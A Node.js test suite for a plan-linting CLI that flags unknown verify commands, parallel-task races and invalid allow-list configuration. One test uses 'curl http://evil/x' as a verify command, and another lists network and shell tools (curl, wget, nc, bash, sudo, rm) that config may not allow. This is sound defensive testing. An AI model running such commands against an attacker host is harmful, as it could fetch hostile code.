'use strict';

const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { test, afterEach } = require('node:test');
const assert = require('node:assert/strict');

const planLintCli = require('./plan-lint.cjs');

const _sandboxes = [];

function _mkProject(milestoneTree) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'np-pl-cli-'));
  fs.mkdirSync(path.join(root, '.nubos-pilot'), { recursive: true });
  // Mark project root via STATE.md (findProjectRoot anchors on .nubos-pilot/).
  fs.writeFileSync(path.join(root, '.nubos-pilot', 'STATE.md'),
    '---\nschema_version: 2\ncurrent_phase: null\ncurrent_plan: null\ncurrent_task: null\n---\n', 'utf-8');
  if (milestoneTree) {
    for (const [rel, content] of Object.entries(milestoneTree)) {
      const abs = path.join(root, rel);
      fs.mkdirSync(path.dirname(abs), { recursive: true });
      fs.writeFileSync(abs, content, 'utf-8');
    }
  }
  _sandboxes.push(root);
  return root;
}

function _cap() {
  let buf = '';
  return { stub: { write: (s) => { buf += s; return true; } }, get: () => buf };
}

afterEach(() => {
  while (_sandboxes.length) {
    try { fs.rmSync(_sandboxes.pop(), { recursive: true, force: true }); } catch {}
  }
});

function _taskMd(id, filesModified, dependsOn, verifyText) {
  return _taskMdBlocks(id, filesModified, dependsOn, [verifyText]);
}

// D5: the multi-block shape. Real plans carry more than one <verify> block
// (TVC-7/TVC-17), and the race lint has to see every one of them.
function _taskMdBlocks(id, filesModified, dependsOn, verifyTexts) {
  return `---
id: ${id}
files_modified: ${JSON.stringify(filesModified)}
depends_on: ${JSON.stringify(dependsOn)}
---
# ${id}

${verifyTexts.map((v) => `<verify>${v}</verify>`).join('\n\nprose between the blocks\n\n')}
`;
}

test('PLCLI-1: refuses without --milestone or path', () => {
  assert.throws(
    () => planLintCli.run([], { cwd: _mkProject({}), stdout: _cap().stub }),
    (err) => err && err.code === 'plan-lint-missing-target',
  );
});

test('PLCLI-2: rejects malformed --milestone value', () => {
  assert.throws(
    () => planLintCli.run(['--milestone', 'm1'], { cwd: _mkProject({}), stdout: _cap().stub }),
    (err) => err && err.code === 'plan-lint-invalid-milestone',
  );
});

test('PLCLI-3: rejects nonexistent milestone directory', () => {
  assert.throws(
    () => planLintCli.run(['--milestone', 'M999'], { cwd: _mkProject({}), stdout: _cap().stub }),
    (err) => err && err.code === 'plan-lint-milestone-not-found',
  );
});

test('PLCLI-4: returns exit 0 + zero findings on a clean milestone', () => {
  const root = _mkProject({
    '.nubos-pilot/milestones/M001/M001-PLAN.md': '# Milestone\n\n<verify>echo ok</verify>\n',
    '.nubos-pilot/milestones/M001/slices/S001/S001-PLAN.md': '# Slice\n\n<verify>echo ok</verify>\n',
    '.nubos-pilot/milestones/M001/slices/S001/tasks/T0001/T0001-PLAN.md': _taskMd(
      'M001-S001-T0001', ['src/foo.ts'], [], 'echo ok',
    ),
  });
  const cap = _cap();
  const code = planLintCli.run(['--milestone', 'M001'], { cwd: root, stdout: cap.stub });
  const payload = JSON.parse(cap.get());
  assert.equal(code, 0);
  assert.equal(payload.summary.critical, 0);
  assert.equal(payload.summary.total, 0);
});

test('PLCLI-5: catches the exact M004 plan-bug — verify uses unknown np-tools verb', () => {
  const root = _mkProject({
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0002/T0002-PLAN.md': _taskMd(
      'M004-S001-T0002', [], [],
      'node .nubos-pilot/bin/np-tools.cjs codebase doc-lint',
    ),
  });
  const cap = _cap();
  const code = planLintCli.run(['--milestone', 'M004'], { cwd: root, stdout: cap.stub });
  const payload = JSON.parse(cap.get());
  assert.equal(code, 2, 'must exit non-zero on critical findings');
  const verifyFinding = payload.files
    .flatMap((f) => f.findings)
    .find((f) => f.category === 'verify-command-unknown');
  assert.ok(verifyFinding, 'expected verify-command-unknown finding');
  assert.equal(verifyFinding.severity, 'critical');
  assert.equal(verifyFinding.raw.reason, 'np-tools-unknown-verb');
});

test('PLCLI-6: catches the exact M004 plan-bug — parallel race against working-tree-reading verify', () => {
  const root = _mkProject({
    // T0001 modifies migration files
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0001/T0001-PLAN.md': _taskMd(
      'M004-S001-T0001',
      ['database/migrations/2024_01_01_000000_install_cashier.php'],
      [],
      'php artisan migrate',
    ),
    // T0002 runs update-docs which hashes working tree → implicit dep
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0002/T0002-PLAN.md': _taskMd(
      'M004-S001-T0002', [], [],
      'node .nubos-pilot/bin/np-tools.cjs update-docs --check',
    ),
  });
  const cap = _cap();
  const code = planLintCli.run(['--milestone', 'M004'], { cwd: root, stdout: cap.stub });
  const payload = JSON.parse(cap.get());
  assert.equal(code, 2);
  const raceFinding = payload.parallel_race_findings.find(
    (f) => f.category === 'parallel-task-implicit-dependency',
  );
  assert.ok(raceFinding, 'expected parallel-task-implicit-dependency finding');
  assert.equal(raceFinding.target, 'M004-S001-T0002');
  assert.deepEqual(raceFinding.raw.conflicts, ['M004-S001-T0001']);
});

test('PLCLI-7: catches over-specification (Schema::create DDL in PLAN body)', () => {
  const root = _mkProject({
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0001/T0001-PLAN.md': _taskMd(
      'M004-S001-T0001', ['x.php'], [], 'echo ok',
    ).replace('# M004-S001-T0001\n',
      '# M004-S001-T0001\n\nSchema::create(\'subscriptions\', function () {});\n'),
  });
  const cap = _cap();
  const code = planLintCli.run(['--milestone', 'M004'], { cwd: root, stdout: cap.stub });
  const payload = JSON.parse(cap.get());
  // Major (advisory) is not enough to fail the gate by default — exit 0.
  assert.equal(code, 0);
  const finding = payload.files
    .flatMap((f) => f.findings)
    .find((f) => f.category === 'plan-over-specifies-implementation');
  assert.ok(finding);
  assert.equal(finding.severity, 'major');
});

test('PLCLI-8: lints a single file when given a path argument', () => {
  const root = _mkProject({
    'mytask.md': _taskMd('M001-S001-T0001', [], [], 'node .nubos-pilot/bin/np-tools.cjs nonexistent-verb'),
  });
  const cap = _cap();
  const code = planLintCli.run(['mytask.md'], { cwd: root, stdout: cap.stub });
  const payload = JSON.parse(cap.get());
  assert.equal(code, 2);
  assert.equal(payload.files.length, 1);
  assert.ok(payload.files[0].findings.find((f) => f.category === 'verify-command-unknown'));
});

test('PLCLI-9: file-not-found surfaces a clear error', () => {
  assert.throws(
    () => planLintCli.run(['nonexistent.md'], { cwd: _mkProject({}), stdout: _cap().stub }),
    (err) => err && err.code === 'plan-lint-file-not-found',
  );
});

test('PLCLI-10: end-to-end — all three M004 plan-bug classes surfaced together', () => {
  const root = _mkProject({
    // T0001 modifies migration files (race target)
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0001/T0001-PLAN.md': _taskMd(
      'M004-S001-T0001',
      ['database/migrations/0001_01_01_000004_create_customer_columns_table.php'],
      [],
      'php artisan migrate',
    ),
    // T0002 has working-tree-reader verify (creates implicit race) AND
    // an unknown np-tools verb on the second line.
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0002/T0002-PLAN.md': _taskMd(
      'M004-S001-T0002', [], [],
      'node .nubos-pilot/bin/np-tools.cjs update-docs --check\nnode .nubos-pilot/bin/np-tools.cjs codebase doc-lint',
    ),
  });
  const cap = _cap();
  const code = planLintCli.run(['--milestone', 'M004'], { cwd: root, stdout: cap.stub });
  const payload = JSON.parse(cap.get());
  assert.equal(code, 2);
  const cats = new Set([
    ...payload.files.flatMap((f) => f.findings).map((f) => f.category),
    ...payload.parallel_race_findings.map((f) => f.category),
  ]);
  assert.ok(cats.has('verify-command-unknown'),
    'must catch verify-command-unknown — saw: ' + [...cats].join(', '));
  assert.ok(cats.has('parallel-task-implicit-dependency'),
    'must catch parallel-task-implicit-dependency — saw: ' + [...cats].join(', '));
  assert.ok(cats.has('plan-over-specifies-implementation'),
    'must catch plan-over-specifies-implementation (framework-timestamped filename) — saw: '
      + [...cats].join(', '));
});

// D5: _sliceTaskCollect carried a private, non-`g` copy of the SSOT verify regex,
// so verifyText ended after the FIRST <verify> block. A working-tree-reading
// check in any later block was invisible to the race lint — a `critical` finding
// that could not fire. PLCLI-6/10 only ever exercised single-block plans, which
// is why the blindness survived. lib/plan-lint.cjs reads every block via the
// SSOT (`g` flag); the two copies had silently drifted apart.
test('PLCLI-11: race finding fires when the working-tree-reading verify is in the SECOND block (D5)', () => {
  const root = _mkProject({
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0001/T0001-PLAN.md': _taskMd(
      'M004-S001-T0001', ['database/migrations/x.php'], [], 'php artisan migrate',
    ),
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0002/T0002-PLAN.md': _taskMdBlocks(
      'M004-S001-T0002', [], [],
      ['<automated>echo ok</automated>',
        '<automated>node .nubos-pilot/bin/np-tools.cjs update-docs --check</automated>'],
    ),
  });
  const cap = _cap();
  planLintCli.run(['--milestone', 'M004'], { cwd: root, stdout: cap.stub });
  const race = JSON.parse(cap.get()).parallel_race_findings
    .filter((f) => f.category === 'parallel-task-implicit-dependency');
  assert.equal(race.length, 1,
    'the non-g regex stopped at block 1, so the update-docs verify in block 2 was invisible');
  assert.equal(race[0].target, 'M004-S001-T0002');
  assert.deepEqual(race[0].raw.conflicts, ['M004-S001-T0001']);
});

test('PLCLI-12: a stateless verify in every block raises nothing (D5 — no false positive)', () => {
  const root = _mkProject({
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0001/T0001-PLAN.md': _taskMd(
      'M004-S001-T0001', ['database/migrations/x.php'], [], 'php artisan migrate',
    ),
    '.nubos-pilot/milestones/M004/slices/S001/tasks/T0002/T0002-PLAN.md': _taskMdBlocks(
      'M004-S001-T0002', [], [],
      ['<automated>echo ok</automated>', '<automated>echo still ok</automated>'],
    ),
  });
  const cap = _cap();
  planLintCli.run(['--milestone', 'M004'], { cwd: root, stdout: cap.stub });
  assert.deepEqual(JSON.parse(cap.get()).parallel_race_findings, []);
});

// ---------------------------------------------------------------------------
// plan_lint.verify_allow_commands — the config seam for the deny-by-default
// <verify> allow-list. lib/plan-lint.cjs has read `opts.allowExtraCommands`
// since the allow-list landed, but nothing ever passed it: a foreign project
// with a bespoke runner (`acmerunner`, `frobtool`, …) got a critical finding on
// every plan and had no way to say "this tool is ours". The error hint even
// told them to use an option that no caller exposed. Common polyglot runners
// (just/bazel/mise/nx/…) are built in; the seam is for a project's own tools,
// so these tests use deliberately fictional names that will never be built in.
// ---------------------------------------------------------------------------

function _cfg(obj) {
  return { '.nubos-pilot/config.json': JSON.stringify(obj, null, 2) };
}

test('PLCLI-CFG-1: an unknown runner is a critical finding when the config does not allow it', () => {
  const root = _mkProject({
    'mytask.md': _taskMd('M001-S001-T0001', [], [], 'acmerunner verify'),
  });
  const cap = _cap();
  const code = planLintCli.run(['mytask.md'], { cwd: root, stdout: cap.stub });
  const finding = JSON.parse(cap.get()).files
    .flatMap((f) => f.findings)
    .find((f) => f.category === 'verify-command-unknown');
  assert.equal(code, 2);
  assert.ok(finding, 'deny-by-default must still refuse an unlisted command');
  assert.equal(finding.raw.reason, 'verify-command-not-allowed');
});

test('PLCLI-CFG-2: plan_lint.verify_allow_commands lets a project register its own runner', () => {
  const root = _mkProject({
    ..._cfg({ plan_lint: { verify_allow_commands: ['acmerunner', 'frobtool'] } }),
    'mytask.md': _taskMd('M001-S001-T0001', [], [], 'acmerunner verify\nfrobtool test //...'),
  });
  const cap = _cap();
  const code = planLintCli.run(['mytask.md'], { cwd: root, stdout: cap.stub });
  const payload = JSON.parse(cap.get());
  assert.equal(code, 0, 'a registered runner must not be a finding: ' + cap.get());
  assert.equal(payload.summary.critical, 0);
});

test('PLCLI-CFG-3: the allow-list is scoped — a sibling command stays denied', () => {
  const root = _mkProject({
    ..._cfg({ plan_lint: { verify_allow_commands: ['acmerunner'] } }),
    'mytask.md': _taskMd('M001-S001-T0001', [], [], 'acmerunner verify\nfrobtool run test'),
  });
  const cap = _cap();
  const code = planLintCli.run(['mytask.md'], { cwd: root, stdout: cap.stub });
  const findings = JSON.parse(cap.get()).files.flatMap((f) => f.findings);
  assert.equal(code, 2);
  assert.equal(findings.length, 1, 'only `frobtool` may be flagged');
  assert.equal(findings[0].raw.command, 'frobtool');
});

test('PLCLI-CFG-4: the allow-list also reaches --milestone runs', () => {
  const root = _mkProject({
    ..._cfg({ plan_lint: { verify_allow_commands: ['acmerunner'] } }),
    '.nubos-pilot/milestones/M001/slices/S001/tasks/T0001/T0001-PLAN.md': _taskMd(
      'M001-S001-T0001', ['src/foo.rs'], [], 'acmerunner verify',
    ),
  });
  const cap = _cap();
  const code = planLintCli.run(['--milestone', 'M001'], { cwd: root, stdout: cap.stub });
  assert.equal(code, 0, 'the milestone path must read the same config: ' + cap.get());
});

test('PLCLI-CFG-5: absent config keeps the historical behaviour (empty allow-list)', () => {
  const root = _mkProject({
    ..._cfg({ scope: 'local' }),
    'mytask.md': _taskMd('M001-S001-T0001', [], [], 'acmerunner verify'),
  });
  const cap = _cap();
  assert.equal(planLintCli.run(['mytask.md'], { cwd: root, stdout: cap.stub }), 2);
});

test('PLCLI-CFG-5b: common polyglot runners are built in — no config needed', () => {
  const root = _mkProject({
    'mytask.md': _taskMd('M001-S001-T0001', [], [], 'just verify\nbazel test //...\nmise run test'),
  });
  const cap = _cap();
  const code = planLintCli.run(['mytask.md'], { cwd: root, stdout: cap.stub });
  assert.equal(code, 0, 'built-in runners must not be a finding: ' + cap.get());
});

// --- fail-closed: a broken or hostile value must not pass silently ----------

test('PLCLI-CFG-6: a non-array value is refused loudly, never coerced to []', () => {
  const root = _mkProject({
    ..._cfg({ plan_lint: { verify_allow_commands: 'just' } }),
    'mytask.md': _taskMd('M001-S001-T0001', [], [], 'echo ok'),
  });
  assert.throws(
    () => planLintCli.run(['mytask.md'], { cwd: root, stdout: _cap().stub }),
    (err) => err && err.code === 'plan-lint-invalid-allow-list',
  );
});

test('PLCLI-CFG-7: a non-string entry is refused loudly', () => {
  const root = _mkProject({
    ..._cfg({ plan_lint: { verify_allow_commands: ['just', 7] } }),
    'mytask.md': _taskMd('M001-S001-T0001', [], [], 'echo ok'),
  });
  assert.throws(
    () => planLintCli.run(['mytask.md'], { cwd: root, stdout: _cap().stub }),
    (err) => err && err.code === 'plan-lint-invalid-allow-list',
  );
});

test('PLCLI-CFG-8: an entry that is not a bare command name is refused', () => {
  for (const bad of ['just verify', './bin/x', 'a;b', '', '  ']) {
    const root = _mkProject({
      ..._cfg({ plan_lint: { verify_allow_commands: [bad] } }),
      'mytask.md': _taskMd('M001-S001-T0001', [], [], 'echo ok'),
    });
    assert.throws(
      () => planLintCli.run(['mytask.md'], { cwd: root, stdout: _cap().stub }),
      (err) => err && err.code === 'plan-lint-invalid-allow-list',
      'must refuse allow-list entry ' + JSON.stringify(bad),
    );
  }
});

test('PLCLI-CFG-9: the key cannot re-open the network/shell-escape boundary', () => {
  // The whole point of the guard. Each of these is either explicitly denied or
  // handled before the allow-list is consulted, so accepting them would at best
  // be a dead letter and at worst read like a hole a project can open.
  for (const bad of ['curl', 'wget', 'sh', 'bash', 'eval', 'sudo', 'rm', 'base64', 'nc', 'node', 'env']) {
    const root = _mkProject({
      ..._cfg({ plan_lint: { verify_allow_commands: [bad] } }),
      'mytask.md': _taskMd('M001-S001-T0001', [], [], 'echo ok'),
    });
    assert.throws(
      () => planLintCli.run(['mytask.md'], { cwd: root, stdout: _cap().stub }),
      (err) => err && err.code === 'plan-lint-allow-command-not-overridable',
      'must refuse allow-list entry ' + JSON.stringify(bad),
    );
  }
});

test('PLCLI-CFG-10: a denied command stays denied even next to a legitimate entry', () => {
  const root = _mkProject({
    ..._cfg({ plan_lint: { verify_allow_commands: ['just', 'curl'] } }),
    'mytask.md': _taskMd('M001-S001-T0001', [], [], 'curl http://evil/x'),
  });
  assert.throws(
    () => planLintCli.run(['mytask.md'], { cwd: root, stdout: _cap().stub }),
    (err) => err && err.code === 'plan-lint-allow-command-not-overridable',
  );
});

test('PLCLI-CFG-11: no shell, interpreter, denied or forwarding command is allow-listable', () => {
  // The four sets come from lib/plan-lint.cjs by reference, so this cannot drift
  // by construction — what it asserts is the property that makes that matter:
  // every one of those names is handled BEFORE the allow-list is consulted, so
  // accepting it from config.json would be a dead letter that reads like an
  // opened boundary. If lib/ grows a shell, it must land here automatically.
  const planLint = require('../../lib/plan-lint.cjs');
  const names = [
    ...planLint.VERIFY_SHELLS,
    ...planLint.VERIFY_INTERPRETERS.keys(),
    ...planLint.VERIFY_DENIED_COMMANDS.keys(),
    ...planLint.VERIFY_FORWARDERS.keys(),
  ];
  assert.ok(names.length >= 12, 'parity source collapsed to: ' + names.join(','));
  for (const n of names) {
    assert.ok(planLintCli.NON_OVERRIDABLE_COMMANDS.has(n),
      '"' + n + '" is handled before the allow-list but is not refused by config');
    const root = _mkProject({
      ..._cfg({ plan_lint: { verify_allow_commands: [n] } }),
      'mytask.md': _taskMd('M001-S001-T0001', [], [], 'echo ok'),
    });
    // Either refusal is correct: names like `.` fail the bare-command-name shape
    // before the override check reaches them. What must never happen is silence.
    assert.throws(
      () => planLintCli.run(['mytask.md'], { cwd: root, stdout: _cap().stub }),
      (err) => err && (err.code === 'plan-lint-allow-command-not-overridable'
        || err.code === 'plan-lint-invalid-allow-list'),
      'config.json listing "' + n + '" must fail loudly, not be silently honoured',
    );
  }
});

test('PLCLI-13: verify blocks are read through the SSOT, never a private regex (D5)', () => {
  // Guards against a third copy of the regex drifting back in.
  const src = fs.readFileSync(path.join(__dirname, 'plan-lint.cjs'), 'utf-8');
  assert.match(src, /require\('\.\.\/\.\.\/lib\/verify-block\.cjs'\)/,
    'plan-lint must obtain verify blocks from lib/verify-block.cjs');
  assert.equal(/<verify>\(\[\\s\\S\]/.test(src), false,
    'a private <verify> regex in this file IS the D5 defect — use extractVerifyBlocks');
});

test('PLCLI-14: pattern-claim lint runs on the slice plan but not on scaffolded task plans (ADR-0032)', () => {
  const BT = String.fromCharCode(96);
  const mirrorProse = 'Mirror the segment-share pattern fully: build it the same way as '
    + BT + 'app/Actions/ShareSegmentAction.php' + BT + '.';
  const root = _mkProject({
    '.nubos-pilot/milestones/M001/slices/S011/S011-PLAN.md': '# S011\n\n' + mirrorProse + '\n',
    '.nubos-pilot/milestones/M001/slices/S011/tasks/T0001/T0001-PLAN.md': `---
id: M001-S011-T0001
files_modified: []
depends_on: []
---
# T0001

${mirrorProse}
`,
  });
  const cap = _cap();
  const rc = planLintCli.run(['--milestone', 'M001'], { cwd: root, stdout: cap.stub });
  const payload = JSON.parse(cap.get());

  const byPath = new Map(payload.files.map((f) => [path.basename(f.path), f.findings]));
  const sliceFindings = byPath.get('S011-PLAN.md').filter((f) => f.category === 'pattern-claim-unverified');
  const taskFindings = byPath.get('T0001-PLAN.md').filter((f) => f.category === 'pattern-claim-unverified');

  assert.equal(sliceFindings.length, 1, 'slice plan must be flagged');
  assert.equal(taskFindings.length, 0,
    'a scaffolded task plan carries the <action> prose but never the <pattern_refs> block — '
    + 'linting it would be a guaranteed false positive');
  assert.equal(rc, 2, 'a critical finding must exit non-zero');
});
